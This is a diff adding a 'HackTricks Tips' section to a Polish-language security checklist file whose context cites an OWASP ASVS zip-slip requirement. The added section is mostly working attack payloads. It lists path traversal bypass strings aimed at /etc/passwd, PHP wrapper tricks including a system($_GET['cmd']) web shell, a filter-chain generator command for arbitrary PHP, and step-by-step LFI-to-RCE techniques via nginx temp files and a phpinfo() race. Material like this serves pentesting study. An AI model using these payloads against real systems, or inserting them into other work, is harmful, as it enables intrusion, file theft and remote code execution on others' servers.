@@ -188,3 +188,51 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
 | V5.3.3 | File Storage | Verify that server-side file processing, such as file decompression, ignores user-provided path information to prevent vulnerabilities such as zip slip. |
+
+
+---
+
+## HackTricks Tips
+
+### Traversal Bypass
+
+```
+....//....//etc/passwd          # double-dot po strip
+..%252f..%252fetc%252fpasswd   # double URL-encode
+..%c0%af..%c0%afetc%c0%afpasswd  # overlong UTF-8
+/%5C../%5C../etc/passwd         # backslash URL-encoded
+```
+
+**Python `os.path.join` bypass**: `/etc/passwd` (absolute) odrzuca wszystkie poprzednie komponenty
+
+### PHP Wrappers → RCE
+
+- `php://input` + POST: `<?php system($_GET['cmd']); ?>`
+- `php://filter/convert.base64-encode/resource=/etc/passwd`
+- `data://text/plain;base64,<base64_shell>`
+- `zip://shell.jpg%23payload.php` — upload zip z .php renamed na .jpg
+- `phar://uploaded.phar` — trigger deserialization
+- `expect://id` — jeśli expect extension
+
+### LFI → RCE (bez file write!)
+
+- **PHP Filter Chain Generator**: `python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'` — generuje `php://filter/...` chain dekodujący do arbitrary PHP
+- **CVE-2024-2961**: arbitrary file read via PHP filters → RCE via 3-byte heap overflow
+
+### LFI → RCE via Nginx temp files
+
+1. Znajdź nginx worker PID: `?file=/proc/<pid>/cmdline`
+2. Wyślij duży POST (>8KB) → nginx buffer spill do `/var/lib/nginx/body/`
+3. Trzymaj TCP connection otwartą → nginx nie unlink'uje fd
+4. Brute fd 10-45: `?file=/proc/<nginx_pid>/fd/<fd>`
+
+### LFI → RCE via phpinfo() race
+
+1. POST multipart do phpinfo() z PHP payload + ~6KB padding
+2. Parse `$_FILES[tmp_name]` z partial output
+3. Natychmiast fire LFI: `?file=/tmp/phpXXXXXX` przed cleanup
+4. Windows wildcard: `?inc=c:\windows\temp\php<<` (FindFirstFile)
+
+### Top parametry do fuzzowania
+
+`?file=`, `?page=`, `?path=`, `?include=`, `?doc=`, `?view=`, `?download=`
